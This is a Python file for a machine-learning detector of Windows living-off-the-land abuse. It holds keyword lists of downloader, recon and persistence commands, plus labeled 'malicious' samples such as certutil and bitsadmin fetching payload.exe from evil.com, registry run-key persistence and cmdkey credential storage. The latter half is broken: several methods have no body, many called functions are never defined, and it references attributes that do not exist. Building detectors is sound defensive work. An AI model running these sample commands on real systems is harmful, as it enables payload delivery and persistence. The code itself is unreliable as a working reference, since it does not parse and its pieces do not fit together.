import pickle
import numpy as np
from sklearn.ensemble import IsolationForest, RandomForestClassifier
from sklearn.preprocessing import StandardScaler
import re
import logging
from datetime import datetime

class MLThreatAnalyzer:
    def __init__(self):
        self.isolation_forest = IsolationForest(contamination='auto', random_state=42)
        self.classifier = RandomForestClassifier(n_estimators=100, random_state=42)
        self.scaler = StandardScaler()
        self.trained = False
        self.logger = logging.getLogger(__name__)

        # LOLBins often abused in LotL and APTs like Volt Typhoon
        self.lolbins = [
            'powershell.exe', 'cmd.exe', 'mshta.exe', 'wscript.exe', 'cscript.exe',
            'regsvr32.exe', 'rundll32.exe', 'forfiles.exe', 'debug.exe',
            'certutil.exe', 'bitsadmin.exe', 'netsh.exe', 'schtasks.exe',
            'tasklist.exe', 'sc.exe', 'whoami.exe', 'net.exe', 'nltest.exe'
        ]

        self.suspicious_keywords = [
            'bypass', 'hidden', 'encoded', 'invoke-expression', 'downloadstring',
            'webclient', 'bitstransfer', 'compress-archive', 'invoke-webrequest',
            'scriptblocklogging', 'amsiutils', 'frombase64string'
        ]

        self.network_keywords = ['wget', 'curl', 'net use', 'telnet', 'ftp', 'invoke-webrequest', 'connect']
        self.file_keywords = ['del', 'remove-item', 'copy', 'move', 'xcopy', 'robocopy']
        self.reg_keywords = ['reg add', 'reg delete', 'reg query', 'regedit', 'regsvr32']

    def extract_features(self, process_info):
        features = []

        name = process_info.get('name', '').lower()
        cmdline = ' '.join(process_info.get('cmdline', [])).lower()

        # 1. Process name hash
        features.append(hash(name) % 10000)

        # 2. Command line length
        features.append(len(cmdline))

        # 3. Suspicious keyword count
        features.append(sum(1 for kw in self.suspicious_keywords if kw in cmdline))

        # 4. PowerShell-specific flags
        if 'powershell' in name:
            features.append(1)  # is PowerShell
            features.append(1 if re.search(r'[A-Za-z0-9+/]{20,}={0,2}', cmdline) else 0)  # base64
            features.append(1 if 'scriptblocklogging' in cmdline else 0)
        else:
            features.extend([0, 0, 0])

        # 5. Network behavior
        features.append(sum(1 for kw in self.network_keywords if kw in cmdline))

        # 6. File behavior
        features.append(sum(1 for kw in self.file_keywords if kw in cmdline))

        # 7. Registry behavior
        features.append(sum(1 for kw in self.reg_keywords if kw in cmdline))

        # 8. Time of day (hour)
        features.append(datetime.now().hour)

        # 9. LOLBin used (process name)
        features.append(1 if name in self.lolbins else 0)

        # 10. LOLBin reference in command-line
        features.append(sum(1 for lb in self.lolbins if lb in cmdline))

        # 11. Known Volt Typhoon tactics
        volt_typhoon_indicators = [
            'netsh interface portproxy', 'sc config', 'schtasks /create',
            'tasklist', 'nltest /domain_trusts', 'dsquery'
        ]
        features.append(sum(1 for kw in volt_typhoon_indicators if kw in cmdline))
        
        # 12. Netsh proxy manipulation
        netsh_proxy_patterns = ['netsh interface portproxy', 'netsh winhttp set proxy']
        features.append(sum(1 for pattern in netsh_proxy_patterns if pattern in cmdline))
        
        # 13. Domain reconnaissance
        domain_recon_patterns = ['nltest /domain_trusts', 'dsquery', 'net group "domain admins"']
        features.append(sum(1 for pattern in domain_recon_patterns if pattern in cmdline))
        
        # 14. Scheduled task persistence
        schtask_patterns = ['schtasks /create', '/sc onlogon', '/ru system']
        features.append(sum(1 for pattern in schtask_patterns if pattern in cmdline))
        
        # 15. Service manipulation
        service_patterns = ['sc create', 'sc config', 'sc start', 'sc stop']
        features.append(sum(1 for pattern in service_patterns if pattern in cmdline))
        
        # 16. Credential access attempts
        cred_patterns = ['whoami /all', 'net user /domain', 'net accounts']
        features.append(sum(1 for pattern in cred_patterns if pattern in cmdline))
        
        # 17. Defense evasion indicators
        evasion_patterns = ['-windowstyle hidden', '-executionpolicy bypass', 'certutil -urlcache']
        features.append(sum(1 for pattern in evasion_patterns if pattern in cmdline))
        
        # 18. Base64 encoding detection
        b64_pattern = r'[A-Za-z0-9+/]{40,}={0,2}'
        features.append(1 if re.search(b64_pattern, cmdline) else 0)
        
        # 19. Multiple LOLBins in single command
        extended_lolbins = [
            'powershell.exe', 'cmd.exe', 'certutil.exe', 'netsh.exe', 'schtasks.exe',
            'sc.exe', 'nltest.exe', 'wmic.exe', 'regsvr32.exe', 'rundll32.exe',
            'mshta.exe', 'bitsadmin.exe', 'forfiles.exe', 'whoami.exe'
        ]
        lolbin_count = sum(1 for lolbin in extended_lolbins if lolbin in cmdline)
        features.append(min(lolbin_count, 5))  # Cap at 5 to prevent feature explosion
        
        # 20. Suspicious timing (off-hours activity)
        current_hour = datetime.now().hour
        features.append(1 if current_hour < 6 or current_hour > 22 else 0)
        
        # 21. High-severity LOLBins
        high_severity_lolbins = ['powershell.exe', 'rundll32.exe', 'regsvr32.exe', 'certutil.exe', 'msbuild.exe']
        features.append(1 if name in high_severity_lolbins else 0)
        
        # 22. Medium-severity LOLBins
        medium_severity_lolbins = ['cmd.exe', 'bitsadmin.exe', 'wmic.exe', 'msiexec.exe']
        features.append(1 if name in medium_severity_lolbins else 0)

        # Ensure exactly 22 features
        if len(features) != 22:
            self.logger.warning(f"Feature count mismatch: {len(features)} features, expected 22")
            # Pad or truncate to exactly 22 features
            while len(features) < 22:
                features.append(0)
            features = features[:22]

        return np.array(features).reshape(1, -1)

    def train_baseline(self, normal_processes):
        if not normal_processes:
            return False

        try:
            self.logger.info(f"Training ML model with {len(normal_processes)} samples...")
            
            # Extract features from all training samples
            training_features = []
            for proc in normal_processes:
                try:
                    features = self.extract_features(proc).flatten()
                    training_features.append(features)
                except Exception as e:
                    self.logger.warning(f"Failed to extract features from sample: {e}")
                    continue
            
            if len(training_features) < 10:
                self.logger.error("Insufficient training data - need at least 10 samples")
                return False
            
            X_train = np.array(training_features)
            self.logger.info(f"Training data shape: {X_train.shape}")
            
            # Scale the features
            X_scaled = self.scaler.fit_transform(X_train)
            
            # Train the isolation forest
            self.isolation_forest.fit(X_scaled)
            self.trained = True
            
            self.logger.info("✅ ML model training completed successfully")
            return True
            
        except Exception as e:
            self.logger.error(f"Error during ML training: {e}")
            return False

    def predict_threat(self, process_info):
        if not self.trained:
            return {'error': 'Model not trained'}

        features = self.extract_features(process_info)
        features_scaled = self.scaler.transform(features)

        anomaly_score = self.isolation_forest.decision_function(features_scaled)[0]
        is_anomaly = self.isolation_forest.predict(features_scaled)[0] == -1
        risk_score = max(0, min(10, (1 - anomaly_score) * 5))

        return {
            'risk_score': risk_score,
            'is_anomaly': is_anomaly,
            'confidence': abs(anomaly_score),
            'features_analyzed': len(features.flatten())
        }

    def save_model(self, filepath):
        model_data = {
            'isolation_forest': self.isolation_forest,
            'scaler': self.scaler,
            'trained': self.trained
        }
        with open(filepath, 'wb') as f:
            pickle.dump(model_data, f)

    def load_model(self, filepath):
        try:
            with open(filepath, 'rb') as f:
                model_data = pickle.load(f)
            self.isolation_forest = model_data['isolation_forest']
            self.scaler = model_data['scaler']
            self.trained = model_data['trained']
            return True
        except Exception as e:
            print(f"Error loading model: {e}")
            return False
def get_labeled_lolbins():
    """
    Returns a list of known LOLBin and script-based malicious process samples for supervised training.
    Each sample is a tuple: (process_info_dict, label)
    Label: 1 = malicious
    """
    lolbin_samples = [
        # PowerShell
        {"name": "powershell.exe", "cmdline": ["powershell.exe", "-File", "C:\\Users\\Public\\script.ps1"]},
        {"name": "powershell.exe", "cmdline": ["powershell.exe", "-enc", "badbase64=="]},

        # DLL Execution
        {"name": "rundll32.exe", "cmdline": ["rundll32.exe", "C:\\Windows\\System32\\evil.dll,EntryPoint"]},
        {"name": "regsvr32.exe", "cmdline": ["regsvr32.exe", "/s", "C:\\Temp\\malicious.dll"]},
        {"name": "regsvcs.exe", "cmdline": ["regsvcs.exe", "C:\\malicious\\evil.dll"]},

        # Script Engines
        {"name": "wscript.exe", "cmdline": ["wscript.exe", "C:\\Scripts\\payload.vbs"]},
        {"name": "cscript.exe", "cmdline": ["cscript.exe", "C:\\Scripts\\payload.js"]},
        {"name": "wscript.exe", "cmdline": ["wscript.exe", "C:\\Scripts\\malicious.wsf"]},

        # HTA/INF/CHM
        {"name": "mshta.exe", "cmdline": ["mshta.exe", "C:\\Users\\User\\Desktop\\malicious.hta"]},
        {"name": "cmstp.exe", "cmdline": ["cmstp.exe", "C:\\Temp\\payload.inf"]},
        {"name": "hh.exe", "cmdline": ["hh.exe", "C:\\Temp\\malicious.chm"]},

        # Installers and Encoders
        {"name": "installutil.exe", "cmdline": ["installutil.exe", "C:\\Malware\\evil.dll"]},
        {"name": "dfsvc.exe", "cmdline": ["dfsvc.exe", "http://evil.com/app.application"]},

        # Alternate stream & downloaders
        {"name": "certutil.exe", "cmdline": ["certutil.exe", "-urlcache", "-f", "http://malicious.com/payload.exe"]},
        {"name": "bitsadmin.exe", "cmdline": ["bitsadmin.exe", "/transfer", "job", "http://evil.com/payload.exe"]},

        # Scheduled tasks and services
        {"name": "schtasks.exe", "cmdline": ["schtasks.exe", "/create", "/tn", "eviljob", "/tr", "C:\\evil\\payload.exe", "/sc", "onlogon"]},
        {"name": "sc.exe", "cmdline": ["sc.exe", "create", "evilsvc", "binpath=", "C:\\evil\\service.exe"]},

        # Recon, Credential, WMI abuse
        {"name": "wmic.exe", "cmdline": ["wmic.exe", "process", "call", "create", "payload.exe"]},
        {"name": "netsh.exe", "cmdline": ["netsh.exe", "interface", "portproxy", "add", "v4tov4", "listenport=1234", "connectport=5678", "connectaddress=10.0.0.1"]},
        {"name": "reg.exe", "cmdline": ["reg.exe", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "evil", "/t", "REG_SZ", "/d", "C:\\evil\\payload.exe"]},
        {"name": "tasklist.exe", "cmdline": ["tasklist.exe", "/v"]},
        {"name": "cmdkey.exe", "cmdline": ["cmdkey.exe", "/add:evil", "/user:admin", "/pass:password"]},

        # DLL loaders from libraries (bonus)
        {"name": "rundll32.exe", "cmdline": ["rundll32.exe", "shell32.dll,Control_RunDLL"]},
        {"name": "rundll32.exe", "cmdline": ["rundll32.exe", "shdocvw.dll,OpenURL", "http://malicious.com"]},
        {"name": "rundll32.exe", "cmdline": ["rundll32.exe", "mshtml.dll,RunHTMLApplication", "evil.hta"]}
    ]

    return [(sample, 1) for sample in lolbin_samples]
def validate_process_authenticity(process_info):
    """Validate process through multiple factors"""
    checks = {
        'digital_signature': verify_digital_signature(process_info['path']),
        'file_hash': check_known_good_hashes(process_info['hash']),
        'parent_process': validate_parent_process_chain(process_info['ppid']),
        'execution_context': analyze_execution_context(process_info),
        'file_location': validate_execution_path(process_info['path'])
    }
    return calculate_authenticity_score(checks)
class EnhancedPatternDetector:
    def __init__(self):
        self.behavioral_patterns = self.load_behavioral_signatures()
        self.contextual_rules = self.load_contextual_rules()
    
    def analyze_with_context(self, process_info, system_state):
        """Context-aware pattern analysis"""
        # Consider system state, user behavior, time patterns
        # Implement fuzzy matching for obfuscated commands
        # Use graph-based analysis for process relationships
def extract_enhanced_features(process_info):
    """Extract comprehensive feature set"""
    features = {
        # Static features
        'file_entropy': calculate_file_entropy(process_info['path']),
        'import_table_hash': hash_import_table(process_info['path']),
        'section_characteristics': analyze_pe_sections(process_info['path']),
        
        # Dynamic features
        'command_line_entropy': calculate_string_entropy(process_info['cmdline']),
        'parent_child_relationship': analyze_process_tree(process_info),
        'timing_patterns': analyze_execution_timing(process_info),
        
        # Contextual features
        'user_session_context': get_user_session_info(),
        'network_environment': get_network_context(),
        'system_load_context': get_system_resource_usage()
    }
    return features
class EnsembleSecurityAnalyzer:
    def __init__(self):
        self.models = {
            'random_forest': load_model('rf_security_model.pkl'),
            'gradient_boost': load_model('gb_security_model.pkl'),
            'neural_network': load_model('nn_security_model.pkl'),
            'isolation_forest': load_model('if_anomaly_model.pkl')
        }
    
    def predict_with_confidence(self, features):
        """Ensemble prediction with confidence intervals"""
        predictions = {}
        for name, model in self.models.items():
            pred, confidence = model.predict_with_uncertainty(features)
            predictions[name] = {'prediction': pred, 'confidence': confidence}
        
        return self.aggregate_predictions(predictions)
class EnhancedSandboxManager:
    def __init__(self):
        self.container_runtime = DockerManager()
        self.network_isolation = NetworkIsolationManager()
    
    async def analyze_in_container(self, process_info):
        """Analyze process in isolated container"""
        container_config = {
            'image': 'security-analysis:latest',
            'network_mode': 'none',  # Complete network isolation
            'memory_limit': '512m',
            'cpu_limit': 0.5,
            'read_only_root': True,
            'security_opts': ['no-new-privileges:true']
        }
        
        # Create monitoring probes
        monitors = [
            FileSystemMonitor(),
            NetworkActivityMonitor(),
            ProcessActivityMonitor(),
            SystemCallMonitor()
        ]
        
        results = await self.container_runtime.execute_with_monitoring(
            process_info, container_config, monitors, timeout=60
        )
        
        return self.analyze_execution_results(results)
class ProbabilisticDecisionEngine:
    def __init__(self):
        self.decision_tree = self.load_decision_tree()
        self.uncertainty_threshold = 0.3
    
    def make_decision(self, analysis_results):
        """Make decision with uncertainty quantification"""
        # Calculate prediction intervals
        risk_score, confidence_interval = self.calculate_risk_with_uncertainty(analysis_results)
        
        # Consider decision impact
        decision_impact = self.assess_decision_impact(analysis_results)
        
        # Apply conservative decisions making under uncertainty
        if confidence_interval[1] - confidence_interval[0] > self.uncertainty_threshold:
            # High uncertainty - be more conservative
            decision = self.conservative_decision(risk_score, decision_impact)
        else:
            # Low uncertainty - normal decision process
            decision = self.standard_decision(risk_score)
        
        return {
            'decision': decision,
            'risk_score': risk_score,
            'confidence_interval': confidence_interval,
            'reasoning': self.explain_decision(analysis_results, decision)
        }
class AdaptiveLearningSystem:
    def __init__(self):
        self.feedback_buffer = []
        self.model_update_threshold = 100
    
    def record_decision_outcome(self, decision_data, actual_outcome):
        """Record decision outcomes for continuous learning"""
        self.feedback_buffer.append({
            'features': decision_data['features'],
            'predicted_risk': decision_data['risk_score'],
            'actual_outcome': actual_outcome,
            'timestamp': datetime.now()
        })
        
        if len(self.feedback_buffer) >= self.model_update_threshold:
            self.retrain_models()
    
    def retrain_models(self):
        """Retrain models with new feedback data"""
        # Implement incremental learning
        # Update model weights based on recent performance
        # Maintain model version history for rollback capability
class AdaptiveMLAnalyzer(MLThreatAnalyzer):
    def __init__(self):
        super().__init__()
        self.feedback_buffer = []
        self.retrain_interval = 1000  # Retrain after 1000 predictions
        
    def record_outcome(self, prediction, actual):
        self.feedback_buffer.append((prediction, actual))
        if len(self.feedback_buffer) >= self.retrain_interval:
            self.retrain_model()
            
    def retrain_model(self):
        # Create new training dataset
        X_new = [self.extract_features(p[0]) for p in self.feedback_buffer]
        y_new = [p[1] for p in self.feedback_buffer]  # Actual labels
        
        # Combine with existing training data
        X_combined = np.vstack([self.X_train, X_new])
        y_combined = np.concatenate([self.y_train, y_new])
        
        # Retrain model
        self.model.fit(X_combined, y_combined)
        
        # Clear buffer
        self.feedback_buffer = []